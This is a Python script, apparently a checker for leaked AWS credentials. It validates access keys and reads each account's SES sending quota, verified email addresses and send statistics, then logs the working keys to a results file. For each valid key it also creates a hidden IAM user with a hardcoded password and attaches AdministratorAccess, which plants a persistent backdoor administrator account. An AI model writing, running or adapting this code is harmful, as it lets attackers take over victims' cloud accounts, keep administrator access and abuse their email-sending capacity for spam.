import boto3
from tool._print import aws_print

def ceret(key,sec,reg):
    try:
        UsernameLogin = "erdepe"
        client = boto3.client('iam',aws_access_key_id = key, aws_secret_access_key = sec, region_name = reg)
        Create_user = client.create_user(UserName=UsernameLogin,)
        bitcg = (f"User: {Create_user['User'] ['UserName']}")
        xxxxcc = (f"User: {Create_user['User'] ['Arn']}")
        pws = "Modol12345tai@"
        Buat = client.create_login_profile(Password=pws,PasswordResetRequired=False,UserName=UsernameLogin)
        Admin = client.attach_user_policy(
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess',UserName=UsernameLogin,)
        xxx = UsernameLogin+"|"+pws+"|"+bitcg + "|" +  xxxxcc
        remover = str(xxx).replace('\r', '')
        with open('results/IAM_Account.txt', 'a') as simpan:
            simpan.write(remover+'\n\n')
    except:
        pass

def main(key,sec,reg):
    try:
        client = boto3.client('ses',aws_access_key_id= key ,aws_secret_access_key = sec, region_name = reg)
        data = (f" ACCOUNT : {key} | {sec} | {reg} ")
        response = client.get_send_quota()
        limit =  (f"Max Send email 24 Hours: {response['Max24HourSend']} ")
        ddd = client.list_verified_email_addresses()
        getEmailListVer = (f"Email Verification from mail:{ddd['VerifiedEmailAddresses']}")
        response = client.list_identities(IdentityType= 'EmailAddress',MaxItems= 123,NextToken='',)
        listemail = (f"Email: {response['Identities']}")
        statistic = client.get_send_statistics()
        getStatistic = (f"Email Sent Today Ini:{statistic['SendDataPoints']}")
        xxx = key+"|"+sec+"|"+reg + "|" +  limit +"|" + listemail
        remover = str(xxx).replace('\r', '')
        with open('Results/Active.txt', 'a') as simpan:
            simpan.write(remover+'\n\n')
        ValidData = key + ":" + sec + ":" + reg
        remover = str(ValidData).replace('\r', '')
        response = client.list_users()
        ceret(key,sec,reg)
        return aws_print(key=key,sec=sec,reg=reg,limit=limit,listemail=listemail)
    except Exception:
        pass